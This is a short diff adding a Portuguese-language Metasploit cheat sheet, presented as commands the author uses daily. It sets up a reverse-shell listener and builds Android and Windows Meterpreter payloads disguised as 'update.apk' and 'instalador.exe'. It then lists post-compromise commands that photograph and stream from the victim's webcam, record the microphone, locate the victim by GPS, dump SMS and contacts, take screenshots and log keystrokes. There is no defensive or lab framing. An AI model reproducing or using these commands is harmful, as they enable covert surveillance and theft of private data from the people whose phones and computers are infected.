@@ -1,0 +1,31 @@
+# METASPLOIT 2025 – COMANDOS QUE EU USO TODO DIA
+msfconsole
+
+# Listener universal (Android + Windows)
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit -j
+
+# Gera APK rápido
+msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 R > ~/Desktop/update.apk
+
+# Gera .exe Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=443 -f exe > instalador.exe
+
+# Comandos top quando cair sessão
+sessions -i 1                     # entra na sessão
+sysinfo                           # vê modelo do celular
+webcam_list                       # lista câmeras
+webcam_snap -i 1                  # foto frontal
+webcam_stream -i 1                # vídeo ao vivo
+record_mic 30                     # grava 30 segundos
+geolocate                         # localização GPS exata
+dump_sms                          # todas as SMS
+dump_contacts                     # contatos
+screenshot                        # print da tela
+keyscan_start                     # começa a gravar tudo que digita
+keyscan_dump                      # mostra o que digitou
+keyscan_stop
+shell                             # abre terminal do Android
